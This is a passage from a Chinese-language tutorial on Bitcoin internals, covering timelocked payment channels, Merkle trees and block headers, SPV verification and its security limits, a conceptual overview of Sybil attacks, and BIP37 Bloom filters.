<li>之后每天Alice会继续创建类似的交易Tx3，都是用Tx1的输出作为输入。但是每次支付给Bob的币都在增多，留给自己的在减少。Bob收到之后进行验证。</li>
<li>当Alice决定停止使用服务的时候，通知Bob，Bob对收到的最后一个Tx3进行签名并且广播。</li>
</ol>
<p>如果Alice想利用Tx2进行双重支付，会不会成功呢？这时就是locktime起作用的时候了。因为这个Tx2不会立刻生效，所以Bob签字的Tx3会被首先确认，之后Tx2因为和Tx3使用的同一个输入，所以Tx2就是一个无效交易，因此双重支付不会成功。</p>
<hr>
<p>参照</p>
<p>[<a href="https://link.zhihu.com/?target=https://aaron67.cc/2019/01/02/bitcoin-transaction-timelocks/">学习笔记] 比特币交易的时间锁aaron67.cc<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233029.jpg" alt="图标"></a></p>
<p>和</p>
<p>[<a href="https://link.zhihu.com/?target=https://aaron67.cc/2018/12/31/bitcoin-transaction-null-data/">学习笔记] OP_RETURNaaron67.cc<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233030.jpg" alt="图标"></a></p>
<p>补充部分内容</p>
<hr>
<h2 id="智能合约"><a href="#智能合约" class="headerlink" title="智能合约"></a>智能合约</h2><p>以上的例子实际上就是智能合约（在区块链上运行的程序）。通过使用脚本、矿工和交易验证能够实现传统上需要第三方中心机构才能完成的一些功能，这是一件相当了不起的事情。对智能合约的研究远远超出了上面列出来的例子，虽然比特币对智能合约的支持并不完善，但是如上所示，已经可以完成不少有意义的工作。</p>
<p>参考：</p>
<ol>
<li><p><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0011.mediawiki">https://github.com/bitcoin/bips/blob/master/bip-0011.mediawiki</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/Script">Script - Bitcoin Wiki</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://github.com/ChristopherA/Learning-Bitcoin-from-the-Command-Line">ChristopherA&#x2F;Learning-Bitcoin-from-the-Command-Line</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/BIP_0016">BIP 0016 - Bitcoin Wiki</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://www.soroushjp.com/2014/12/20/bitcoin-multisig-the-hard-way-understanding-raw-multisignature-bitcoin-transactions/">Bitcoin multisig the hard way: Understanding raw P2SH multisig transactions</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://medium.com/summa-technology/bitcoins-time-locks-27e0c362d7a1">https://medium.com/summa-technology/bitcoins-time-locks-27e0c362d7a1</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0065.mediawiki">bitcoin&#x2F;bips</a></p>
</li>
<li><p><a href="https://link.zhihu.com/?target=https://en.bitcoin.it/wiki/Contract">Contract - Bitcoin Wiki</a></p>
</li>
</ol>
<h1 id="比特币技术9-比特币机制-3"><a href="#比特币技术9-比特币机制-3" class="headerlink" title="比特币技术9:比特币机制(3)"></a>比特币技术9:比特币机制(3)</h1><p>到目前为止，我们重点介绍了单个交易的构建和赎出的过程。在区块链中，多个交易是被打包到一个区块中。使用包含多个交易区块而不是单个交易作为共识的单位，主要的目的是优化，因为如果矿工是针对每个交易而不是多个交易一起进行共识，那么效率就太低了。这一节中，我们主要对区块进行一些介绍。</p>
<h2 id="Merkle树"><a href="#Merkle树" class="headerlink" title="Merkle树"></a>Merkle树</h2><h3 id="比特币中的Merkle树"><a href="#比特币中的Merkle树" class="headerlink" title="比特币中的Merkle树"></a>比特币中的Merkle树</h3><p>之前查看交易信息的时候，可以看到每个交易都是自己相关的区块信息，</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233031.jpg" alt="img"></p>
<p>可以看到交易包含在333676区块中，333676也称为区块的高度；点开看看，<a href="https://link.zhihu.com/?target=https://www.blockchain.com/btc/block-index/511488">Bitcoin Block #333676</a></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233032.jpg" alt="img"></p>
<p>到现在为止，大家应该对其中的大部分信息都比较熟悉了，譬如右侧的哈希项中，除了Merkle Root这一项看起来比较陌生之外，其他的信息应该都能够理解。</p>
<p>区块是一种被包含在公开账簿（区块链）里的聚合了交易信息的容器数据结构。它由一个包含元数据的区块头和紧跟其后的构成区块主体的一长串交易列表组成。区块头是80字节，而平均每个交易至少是250字节，而且平均每个区块至少包含超过500个交易。具体看一下，区块的结构：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233033.jpg" alt="img"></p>
<p>区块链中的区块主要依赖于两种基于Hash的数据结构，一是区块的哈希链，通过哈希指针（hash pointer）形成的链，在上面的链接中，通过点击哈希值，页面可以跳转到之前或者之后的区块；二是区块内的每个块内的交易组成的树状结构。如下图所示。</p>
<p>【哈希指针是一种数据结构，是一个指向数据存储位置及其位置数据的哈希值的指针。这就使得正常的指针可用于取回信息，哈希指针用于验证信息是否发生改变。】</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233034.jpg" alt="img"></p>
<p>上图中，图的上半部分是区块头；下半部分则是对区块头部中的Merkle根的计算过程的展开。每个区块中的交易形成了一棵Merkle树，Merkle树的根包括在区块头中。区块通过保存前一个块的哈希值形成了一条链。区块包括头部和具体的交易，具体来说，区块头部包括如下信息：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233035.jpg" alt="img"></p>
<p>由于区块头里面包含“父区块哈希值”字段，所以当前区块的哈希值也受到该字段的影响。如果父区块的身份标识发生变化，子区块的身份标识也会跟着变化。当父区块有任何改动时，父区块的哈希值也发生变化。这将迫使子区块的“父区块哈希值”字段发生改变，从而又将导致子区块的哈希值发生改变。而子区块的哈希值发生改变又将迫使孙区块的“父区块哈希值”字段发生改变，又因此改变了孙区块哈希值，以此类推。一旦一个区块有很多代以后，这种瀑布效应将保证该区块不会被改变，除非强制重新计算该区块所有后续的区块。正是这样的重新计算需要耗费巨大的计算量，所以一个长区块链的存在可以让区块链的历史不可改变，这也是比特币安全性的一个关键特征。</p>
<p>区块主标识符是它的加密哈希值，一个通过SHA256算法对区块头进行二次哈希计算而得到的数字指纹。产生的32字节哈希值被称为区块哈希值，但是更准确的名称是：区块头哈希值，因为只有区块头被用于计算。例 如: 000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f是第一个比特币区块的区块哈希值。区块哈希值可以唯一、明确地标识一个区块，并且任何节点通过简单地对区块头进行哈希计算都可以独立地获取该区块哈希值。</p>
<hr>
<p>每个区块都包含一个或多个交易。每个区块的第一个交易是coinbase transaction，也即generation transaction，作为矿工打包交易生成区块的奖励，当前的挖矿奖励是12.5个比特币。coinbase交易的UTXO有一个特殊的规定，至少在100个区块之后才能作为输入进行花费。主要是防止矿工在区块还没有被正式确认的情况下就把币给花了。虽然区块并不要求除了coinbase之外的交易，但是矿工们一般都会尽量多打包一些交易，以获得尽可能多的交易费用。</p>
<p>区块中的所有交易都使用二进制<a href="https://link.zhihu.com/?target=https://bitcoin.org/en/glossary/serialized-transaction">raw transaction</a>的格式保存在区块中，然后对raw transaction进行哈希得到交易id（txid）。merkle树就是使用这样的txid进行构造的。</p>
<h3 id="Merkle树概念"><a href="#Merkle树概念" class="headerlink" title="Merkle树概念"></a>Merkle树概念</h3><p>Merkle tree是一种哈希二叉树，以Ralph Merkle命名，Ralph在1979年对该数据结构申请了专利（于2002年过期）。它是一种用做快速归纳和校验大规模数据完整性的树形数据结构。</p>
<p>特点:</p>
<ul>
<li>它是一种树，大多数是<a href="https://zh.wikipedia.org/zh/%E4%BA%8C%E5%8F%89%E6%A0%91">二叉树</a>，也可以是多叉树，具有树结构的所有特点。</li>
<li>Merkle Tree的叶子节点是数据块的哈希。</li>
<li>Merkle Tree的非叶子节点的哈希值是根据它下面所有叶子节点的值哈希计算得到，如下图所示。</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233036.jpg" alt="img"></p>
<p>在上图中， T<sub>A</sub><del>T<sub>H</sub>是区块中包括的正常的交易。从底层向上构建Merkle树，对每个交易都进行哈希，分别得到 H<sub>A</sub></del>H<sub>H</sub>!生成的单个哈希与邻近的哈希值组合，再次进行哈希。譬如  H<sub>A</sub>和 H<sub>B</sub>组合，再次进行哈希，得到 H<sub>AB</sub>. 这个过程一直持续下去，从底层一直到树根。</p>
<p>如果节点总数是奇数个，则复制一份最后一个节点。譬如对于5个叶子节点的情况，最终生成的树可能是这样的：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233037.jpg" alt="img"></p>
<p>如果叶子恰好是2的次方，则在树根处的情况如下：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233038.jpg" alt="img"></p>
<p>在上图中，<strong>merkle root，</strong>标记为 H<sub>ABCDEFGHIJKLMNOP</sub>,是一个32字节的数据，并且会被放置在区块头中，代表了整个区块的交易数据。</p>
<p>由于哈希的单向性，可以得出结论，如果两棵Merkle树的merkle root相同，那么这两棵树的结构和每个节点也必然是相同的。另外，只要存储的叶子节点数据有任何的变动，就会逐级向上传递到相应的父节点，最终使得Merkle树的根节点哈希值发生变化。</p>
<p>除了区块链之外，Merkle可信树在其他领域应用也很多，如在分布式系统中用于数据一致性验证，git中的版本一致性验证也是基于Merkle树。大部分Merkle树是二叉哈希树，在比特币中，merkle树主要适用于组织正常的交易，使得交易易于验证并且使用较少的资源。</p>
<p>为什么要使用这样的数据结构呢？树这种数据结构我们应该是比较熟悉的，特别是这种满二叉树。那我们来算一下，如果如上图所示，有16个叶子节点，也即一个区块中有16个交易，那么总共需要多少次哈希计算？如果是为了保证区块中的交易没有被篡改，那么实际上只需要把16个交易连接起来，然后对整个内容做一次哈希就够了，为什么要这么麻烦形成一棵树，而且做这么多次的计算呢？</p>
<p>我们来使用分布式文件服务器做例子。如果两个服务器A和B都是对某个文件系统的冗余备份。现在希望A和B通信来确认一下，它们所保存的文件是一致的。如果不使用哈希，那么这个通信代价是整个的文件系统，需要把所有的文件都传递到一个进行比较的服务器上，然后进行字符串比较。这无疑是非常低效的。比较哈希当然是一个好方法。因为哈希的单向性和固定的输出长度，所以通信代价就大大降低了。那么为什么要用一棵树呢？</p>
<p>如果A和B两个服务器上存储的文件系统都是一致的，也即两个的哈希值是一样的，那么自然是很好的。如果两个不一致呢？譬如说A服务器上有一个文件更新了，而B服务器还没有来得及更新。怎么样能够快速地定位到导致两个文件系统不一致的文件？</p>
<p>这时就能体现树结构的好处了。如果两个哈希值不一致，A服务器就可以向B服务器要两个子节点的哈希值；然后沿着不一样的路径一直走下去，从而可以确定导致根哈希值不同的文件。而且确定这个不一致文件的复杂度是？</p>
<p>以上是分布式文件服务器的例子。那么在比特币中，Merkle树的作用是什么呢？</p>
<p>默认情况下，一旦接受到一个新交易，节点需要验证它，特别是，验证交易的输入中的每一个之前是否被花费。为了完成这个验证，需要访问区块链。如果节点不信任网络上的其他节点，那么 这个节点需要保存网络上的所有区块，以便验证交易。这种节点称作全节点。在比特币发展的早期，所有节点都是全节点；当前的比特币核心客户端也是完整区块链节点。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233039.jpg" alt="img"></p>
<p>在当前的比特币网络中，实际参与共识的全验证节点（fully validating nodes）并不多，因为全验证节点会维护整个区块链的数据，由于区块链的不可篡改和append-only，随着时间的增加，整个区块链的数据量非常大。在2014年4月份，比特币网络中存储所有区块的数据，需要15GB的空间，现在要完整下载比特币的所有区块数据，需要200GB以上的空间。</p>
<p>全节点要检查第300,000号区块中的某个交易，它会把从该区块开始一直回溯到创世区块的300,000个区块全部都链接起来，建立一个完整的UTXO数据库，通过确认该UTXO是否还未被支付来证实交易的有效性。全验证节点维护所有的UTXO， 最好是存在RAM中，这样，当网络中有新的交易广播时，全验证节点可以快速地进行查询、运行脚本、确定交易是否正确、签名是否有效，如果全部正确，则将交易添加到交易池中。</p>
<h3 id="SPV-simple-payment-verification"><a href="#SPV-simple-payment-verification" class="headerlink" title="SPV(simple payment verification)"></a>SPV(simple payment verification)</h3><p>全验证节点对硬件提出了很高要求，个人用户（移动设备）参与这个过程几乎是不可能的。为了客户友好，对于仅仅使用钱包的普通用户，也即轻量级的节点，比特币网络中的大部分用户都是轻量级的用户，比特币网络并不要求它们也存储所有的信息。这种节点只需要维护能够验证用户自己所care的交易的部分信息就行了。这也是中本聪在比特币白皮书中所提出的SPV（simple payment verification）的概念。SPV可以不需整个网络的数据而确认交易是否存在。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233040.jpg" alt="img"></p>
<p>轻量级节点往往只需要存储区块链头部就可以了。使用有限的信息，轻节点就能够证明某一笔交易是否存在与区块链中。区块头是80字节，一个区块至少是1M，完整交易的区块比区块头的要大的多。因为区块头部信息很少，每年的增加总量大概是在5M左右，所以简单的硬件设备也完全可以运行。</p>
<p>那问题是，SPV是怎么实现的呢？为什么仅仅需要有限的信息就可以进行验证？</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233041.jpg" alt="img">中本聪比特币白皮书中的例子</p>
<p>譬如用户Bob收到用户Alice发来的一笔支付交易，这时Bob必须要验证这笔交易（1）确实存在，并且（2）不是双重支付。对于SPV用户而言，需要从可信节点获得区块链的完整的头部信息，以及和他想验证的交易的Merkle分支。这样，虽然用户不能自己验证交易，但如果能够从区块链的某处找到符合的交易，就可以知道这笔交易已被网络确认，也可以确认该笔交易得到网络多少笔确认。譬如，SPV节点要验证第300,000号区块中的某个交易，它需要获得300,000区块中交易的Merkle分支（Merkle路径）进行验证，并且等到序号从300,001到300,006的六个区块堆叠在该交易所在的区块上。如果网络中的其他节点都接受了第300,000区块，并通过足够的工作在该块之上又生成了六个区块，就可以证明该交易不是双重支付。</p>
<p>使用Merkle分支进行验证是Merkle树的Tamper proof性质， 使用Merkle树之后，可以很容易验证区块中的交易有没有被篡改。譬如在上图中的例子，如果一个交易 T<sub>H</sub>被篡改成了 T<sub>?</sub> ，那么交易的哈希值会不同，沿着从底层到根节点的路径向上，会导致最终树的merkle root不同，也即保存在区块链头的值不同。相反，如果从叶子节点到Merkle根的路径上，所有的哈希值都验证正确，那么可以证明这个交易确实存在于这个区块中。</p>
<p>如上图，如果需要证明某个区块上是否存在一笔交易Tx3，那么全节点返回的Merkle路径是Hash2和Hash01。只需要这两个值就可以进行验证过程如下：</p>
<ul>
<li>Step1：计算交易Tx3的哈希值，得到Hash3</li>
<li>Step2：通过Hash2和Hash3的哈希值，得到父节点的哈希值Hash23</li>
<li>Step3：同上，通过计算Hash23和Hash01哈希值，得到根节点的哈希值。</li>
<li>Step4：将上一步得到的根哈希值对比区块头中MerkleTree的根哈希值，如果相同，则证明该区块中存在交易Tx3，否则说明不存在。</li>
</ul>
<p>使用Merkle树可以大大降低SPV节点的存储和计算负担；下面的表格对比了区块中不同交易数量的情况下，完整区块大小和Merkle路径大小的情况。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233042.jpg" alt="img"></p>
<p>SPV节点的安全性</p>
<p>（1）若全节点返回的是一条恶意的路径？试图为一个不存在于区块链中的节点伪造一条合法的merkle路径，使得最终的计算结果与区块头中的默克尔根哈希相同。</p>
<p>由于哈希的计算具有不可预测性，使得一个恶意的“全”节点想要为一条不存在的节点伪造一条“伪路径”使得最终计算的根哈希与轻节点所维护的根哈希相同是不可能的。</p>
<p>（2）为什么不直接向全节点请求该节点是否存在于区块链中？</p>
<p>由于在公链的环境中，无法判断请求的全节点是否为恶意节点，因此直接向某一个或者多个全节点请求得到的结果是无法得到保证的。但是轻节点本地维护的区块头信息，是经过工作量证明验证的，也就是经过共识一定正确的，若利用全节点提供的Merkle路径，与待验证的节点进行哈希计算，若最终结果与本地维护的区块头中根哈希一致，则能够证明该节点一定存在于默克尔树中。</p>
<p>（3）SPV容易受到什么攻击？</p>
<p>SPV节点毫无疑问可以证实某个交易的存在性，它也能够证明某个区块中不存在某个交易，但它不能验证某个交易（譬如同一个UTXO的双重支付）在整个链中不存在，这是因为SPV节点没有一份关于所有交易的记录。这个漏洞会被针对SPV节点的拒绝服务攻击或双重支付型攻击所利用。为了防御这些攻击，SPV节点需要随机连接到多个节点，以增加与至少一个可靠节点相连接的概率。这种随机连接的需求意味着SPV节点也容易受到网络分区攻击或Sybil攻击。在后者情况中，SPV节点被连接到虚假节点或虚假网络中，没有通向可靠节点或真正的比特币网络的连接。</p>
<p>在绝大多数的实际情况中，具有良好连接的SPV节点是足够安全的，它在资源需求、实用性和安全性之间维持恰当的平衡。当然，如果要保证万无一失的安全性，最可靠的方法还是运行完整区块链的节点。</p>
<blockquote>
<p>完整的区块链节点是通过检查整个链中在它之下的数千个区块来保证这个UTXO没有被支付，从而验证交易。而SPV节点是通过检查在包含该交易的区块所收到的确认数目来验证交易。</p>
</blockquote>
<h2 id="Sybil攻击"><a href="#Sybil攻击" class="headerlink" title="Sybil攻击"></a>Sybil攻击</h2><p>Sybil攻击是指利用社交网络中的少数节点控制多个虚假身份，从而利用这些身份控制或影响网络的大量正常节点的攻击方式 。</p>
<p>直接通信：进行sybil攻击的一种形式是sybil结点直接与合法结点进行通信。当合法结点发送一个无线消息给sybil结点时，sybil结点中的一个会监听这个消息。同样地，从所有sybil结点发送出的消息事实上也是从同一个恶意设备发出的。</p>
<p>间接通信：在这个版本的攻击中，没有一个合法的结点能够直接与sybil结点进行通信。相反，一个或多个恶意的结点宣称他们能够到达sybil结点。因此，发送给sybil结点的消息都是通过其中的一个恶意结点进行路由转发的，这个恶意结点假装把这个消息发送给sybil结点，而事实上就是这个恶意结点自己接收或者拦截了这个消息。</p>
<p>伪造身份：在某些情况下，一个攻击者可以产生任意的sybil身份。比如说如果一个结点的身份是一个32-位的整数，那么攻击者完全可以直接为每一个sybil结点分配一个32-位的值作为它的身份。</p>
<p>盗用身份：如果给定一种机制来识别结点的身份，那么攻击者就不能伪造身份了。举个例子来说，命名空间，由于命名空间本身就是有限的，根本不允许插入一个新的身份。在这种情况下，攻击者需要分配一个合法的身份给sybil结点。这种身份盗用在攻击者把原有结点摧毁或者使之失效的情况下是不好检测的。</p>
<p>同时攻击：攻击者将其所有的sybil身份一次性的同时参与到一次<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1">网络通信</a>中。如果规定一个结点只能使用它的身份一次，那么这个恶意结点就可以循环的使用它的多个sybil身份让人看起来是多个结点。这就是<a href="https://baike.baidu.com/item/%E5%90%8C%E6%97%B6%E6%80%A7/3245687">同时性</a>。</p>
<p>非同时攻击：如果攻击者只在一个特定的<a href="https://baike.baidu.com/item/%E6%97%B6%E9%97%B4%E5%91%A8%E6%9C%9F/7539382">时间周期</a>里使用一部分sybil身份，而在另外一个时间段里是这些身份消失而以另外的sybil身份出现，这看起来就像网络中正常的结点撤销和加入。</p>
<h2 id="Bloom-Filter"><a href="#Bloom-Filter" class="headerlink" title="Bloom Filter"></a>Bloom Filter</h2><p>在之前的例子中，我们并没有涉及一些细节。譬如，SPV节点直接就向全节点请求某一交易的Merkle路径。SPV节点怎么样从网络中接收到与自己相关的交易，确定交易所在的区块呢？</p>
<p>SPV节点一般只需要的是和自己的地址相关的交易。在BIP37之前，SPV的做法是将所有的区块和交易都下载下来，然后本地将不相关的交易给删掉。当然带来的问题就是同步慢、浪费带宽、增加内存使用。在BIP-37中就提到了因为这一点，导致用户对手机APP“Bitcoin Wallet”有所抱怨。</p>
<p>为了解决这个问题，最直接的做法就是SPV节点仅向全节点请求和自己地址相关的交易，也即请全节点过滤和自己地址不相关的信息，如果全节点发现某个交易符合SPV节点的需求时，就将以Merkleblock消息的形式发送该交易，Merkleblock消息包含区块头和Merkle路径。此时，SPV就需要在请求中附上自己的地址信息。</p>
<p>因此与全区块链节点收集每一个区块内的全部交易所不同，SPV节点对特定数据的请求可能无意中透露了钱包里的地址信息。如果监控网络的第三方跟踪某个SPV节点上的钱包所请求的全部交易信息，就能利用这些交易信息把比特币地址和钱包的用户关联起来。</p>
<p>举例来说，如果在问路时，使用具体的地址，如“南京路188号”，那么可能得到具体的位置；但同时也泄露了目的地。如果问不同的人，188号在哪里？可能得到所有188号的信息；然后问南京路在哪里？可以得到一整条路的信息。那么虽然获得的答案中包括一些无关的信息；但是，相对应的，隐私得到了一定程度的保护。</p>
<p>因此，在引入SPV节点&#x2F;轻量级节点后不久，比特币开发人员就添加了一个新功能：Bloom过滤器。这是在2012年的BIP37中引入的。<a href="https://link.zhihu.com/?target=https://github.com/bitcoin/bips/blob/master/bip-0037.mediawiki">bitcoin&#x2F;bips</a> 在比特币中，使用Bloom过滤器来加快钱包同步；以太坊使用Bloom过滤器用于快速查询以太坊区块链的日志。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233043.jpg" alt="img"></p>
<p>布隆过滤器（Bloom Filter）是1970年由布隆提出的，用来判断某个元素是否在集合内，它具有运行速度快（时间效率），占用内存小的优点（空间效率），但是有一定的误识别率和删除困难的问题。它能够判断某个元素一定不在集合内或可能在集合内，也即Bloom Filter会造成一定的False Positive，但是不会造成False Negative。</p>
<p>Bloom过滤器的实现是由一个可变长度（N）的二进制数组（N位二进制数构成一个位域）和数量可变（M）的一组哈希函数组成。这些哈希函数的输出值始终在1和N之间，并且该函数为确定性函数，也即对特定输入总是得到同一个的结果。Bloom过滤器的准确性和私密性能通过改变长度（N）和哈希函数的数量（M）来调节。</p>
<p>与其它数据结构相比较，Bloom filter的优点包括：空间效率和查找时间复杂性；不需要存储元素本身，在保护隐私方面具有优势。</p>
<p>下面通过一些例子来具体解释Bloom Filter的工作原理。</p>
<p>这里使用十六位数组（N&#x3D;16）和三个哈希函数（M&#x3D;3）来演示Bloom过滤器的应用原理。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233044.jpg" alt="img"></p>
<p align="center">由16位数组和3个哈希函数组成的简易Bloom Filter</p>

<p>Bloom过滤器数组里的每一个数的初始值为零。关键词被加到Bloom过滤器中之前，会依次通过每一个哈希函数运算一次。该输入经第一个哈希函数运算后得到了一个在1和N之间的数，它在该数组（编号依次为1至N）中所对应的位被置为1，从而把哈希函数的输出记录下来。接着再进行下一个哈希函数的运算，把另外一位置为1；以此类推。当全部M个哈希函数都运算过之后，一共有M个位的值从0变成了1，这个关键词也被“记录”在了Bloom过滤器里。</p>
<p>向上图中的简易Bloom过滤器添加关键词“A”。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233045.jpg" alt="img"></p>
<p align="center">向简易Bloom过滤器中增加关键词“A”</p>

<p>增加第二个关键词就是简单地重复之前的步骤。关键词依次通过各个哈希函数运算之后，相应的位变为1，Bloom过滤器则记录下该关键词。需要注意的是，当Bloom过滤器里的关键词增加时，它对应的某个哈希函数的输出值的位可能已经是1了，这种情况下，该位不会再次改变。也就是说，随着更多的关键词指向了重复的位，Bloom过滤器随着位1的增加而饱和，准确性也因此降低了。该过滤器之所以是基于概率的数据结构，就是因为关键词的增加会导致准确性的降低。准确性取决于关键字的数量以及数组大小（N）和哈希函数的多少（M）。更大的数组和更多的哈希函数会记录更多的 关键词以提高准确性。而小的数组及有限的哈希函数只能记录有限的关键词从而降低准确性。</p>
<p>【更大的数组可以提高准确性很好理解，因为可以降低冲突；如何理解需要更多哈希函数呢？这里主要是考虑到数组的大小一般而言是比较有限的，因此在单个哈希函数的时候，冲突是不可避免的；但是多个哈希函数同时发生碰撞的可能性就比较小。譬如有一个关键字”abc”被加入进来，只有只有一个哈希函数，有可能“xyz”会和”abc”发生碰撞，此时不能判断”xyz”是不是关键字。但是如果有三个哈希函数，“xyz”和”abc”在三个哈希函数中都碰撞的概率就比较小。】</p>
<p>问题：如果N比较小，当添加关键词时，所有的位都成为1，意味着什么？</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233046.jpg" alt="img">向Bloom Filter增加关键词</p>
<p>为测试某一关键词是否被记录在某个Bloom过滤器中，则将该关键词逐一代入各哈希函数中运算，并将所得的结果与原数组进行对比。如果所有的结果对应的位都变为了1，则表示这个关键词有可能已被该过滤器记录。之所以这一结论并不确定，是因为这些字节1也有可能是其他关键词运算的重叠结果。简单来说，Bloom过滤器正匹配代表着“可能是”。</p>
<p>下图是一个验证关键词“X”是否在前述Bloom过滤器中的例子。相应的比特位都被置为1，所以这个关键词很有可能是匹配的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233047.jpg" alt="img"></p>
<p>测试关键词“X“是否能通过Bloom Filter</p>
<p>另一方面，如果我们代入关键词计算后的结果某位为0，说明该关键词并没有被记录在过滤器里。负匹配的结果不是可能，而是一定。也就是说，负匹配代表着“一定不是”。</p>
<p>下图验证关键词“Y”是否存在于简易Bloom过滤器中的图例。图中某个结果字段为0，该字段一定没有被匹配。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233048.jpg" alt="img"></p>
<p>通过使用Bloom Filter，使得SPV节点只接收交易信息的子集，同时不会泄露哪些是它们感兴趣的地址。实际上，再对Bloom Filter进行设置时，如果带宽和硬件条件宽裕，SPV节点可以选择具有高FP（false positive）率的Bloom Filter，此时如果有第三方对SPV进行跟踪，看到的将是大量的数据中混杂着与节点相关的数据，从而隐私性得到了保护。相反，如果带宽和硬件条件不宽裕，则可以选择尽可能精确的设置从而过滤掉不相关的数据，但是第三方就有可能将交易和IP地址关联起来。</p>
<p><strong>工作过程</strong></p>
<p>首先，SPV节点会初始化一个不会匹配任何关键词的“空白”Bloom过滤器。接下来，SPV节点会创建一个包含钱包中所有地址信息的列表，并创建一个与每个地址相对应的交易输出相匹配的搜索模式。通常，这种搜索模式是一个向公钥付款的哈希脚本，该脚本是一个会出现在每一个向公钥哈希地址（P2PKH）付款的交易中的锁定脚本。如果SPV节点需要追踪P2SH地址余额，搜索模式就会变成P2SH脚本。然后，SPV节点会把每一个搜索模式添加至Bloom过滤器里，这样只要关键词出现在交易中就能够被过滤器识别出来。最后，对等节点会用收到的Bloom过滤器来匹配传送至SPV节点的交易。</p>
<p><strong>用来filter的数据可以是tx.hash,也可以是txout.scriptPubKey中的data，也可以是txin.scriptSig中的data</strong> </p>
<p>Filter匹配算法</p>
<p>Bloom filter可以用于测试任何的数据，查看数据是否与用户加入filter中的数据相关。</p>
<p>在BIP37中，确定交易是否匹配filter，使用以下算法，一旦发现了匹配，则算法停止。</p>
<ol>
<li>测试交易本身的哈希。</li>
<li>对于每个输出，测试输出脚本中的每一个数据项。每一个哈希（密钥）都单独测试。如果在测试交易的时候发现了匹配的输出，那么节点也可以升级filter，将该输出的COutPoint结构也添加到filter中。也即，将该交易的输出中与SPV用户自己相关的部分（可用于其他交易的输入）添加到filter中。</li>
<li>对于每一个输入，测试COutPoint结构。</li>
<li>对于每一个输入，测试输入脚本ScriptSig的每一个数据项。</li>
<li>否则，没有匹配。</li>
</ol>
<p>来分析一下：</p>
<ol>
<li>步骤1是因为用户有可能对某一个特定的交易感兴趣；</li>
<li>步骤2是因为用户可能在过滤器中加入了自己的公钥或地址；如果某一笔交易发钱给自己，那么用该COutpoint来更新过滤器；【检查自己的收入】</li>
<li>步骤3检查自己的花费；</li>
<li>步骤4检查自己的花费；</li>
</ol>
<p>问题：哪些数据应该加入到filter中呢？</p>
<p>在上面的算法中，在step 2中提到“匹配的输出，那么节点也可以更新filter，将该输出的COutPoint结构也添加到filter中”。为什么要对filter进行及时的更新呢？</p>
<p>为啥要加入coutpoint，这里我们可以理解coutpoint是包括了(txid，coutputid)的一个数据结构。</p>
<p>The test for outpoints is there to ensure you can find transactions spending outputs in your wallet, even though you don’t know anything about their form. As you can see, once set on a connection the filter is <strong>not static</strong> and can change throughout the connections lifetime. This is done to avoid the following race condition:</p>
<p>A client sets a filter matching a key in their wallet. They then start downloading the block chain. The part of the chain that the client is missing is requested using getblocks.</p>
<ol>
<li>The first block is read from disk by the serving peer. It contains TX 1 which sends money to the clients key. It matches the filter and is thus sent to the client.</li>
<li>The second block is read from disk by the serving peer. It contains TX 2 which spends TX 1. However TX 2 does not contain any of the clients keys and is thus not sent. The client does not know the money they received was already spent.</li>
</ol>
<p>对outpoints的测试是为了确保能找到花费钱包中的输出的交易，即使你对它们的形式一无所知。正如你所看到的，一旦在连接上设置了过滤器，过滤器就不是静态的，它可以在整个连接的生命周期内改变。这样做是为了避免出现下面的race condition。</p>
<p>客户端设置了与钱包中的密钥（公钥、地址）相匹配的过滤器。然后他们开始下载区块链。客户端缺少的那部分区块链是使用getblocks请求的。</p>
<ul>
<li>第一个区块是由服务节点从磁盘上读取的。它包含TX 1，TX1向客户的密钥（公钥、地址）发送资金。它与过滤器相匹配，因此被发送到客户端。</li>
<li>第二个块是由服务节点从磁盘上读取的。它包含TX 2，它花费了TX 1。然而TX 2不包含任何客户的密钥（公钥、地址），因此没有被发送。客户端不知道他们收到的钱已经被花掉了。</li>
</ul>
<p>BIP 37在实现时，提供了Bloom_update_none选项，也即不更新。主要是因为，随着加入项的增多，Bloom Filter的效率会变低。用户可能需要定时刷新filter。</p>
<p>另外提供了Bloom_update_all选项，也即上文提到的将输出中的scriptpbk中的outpoint都加入进来；</p>
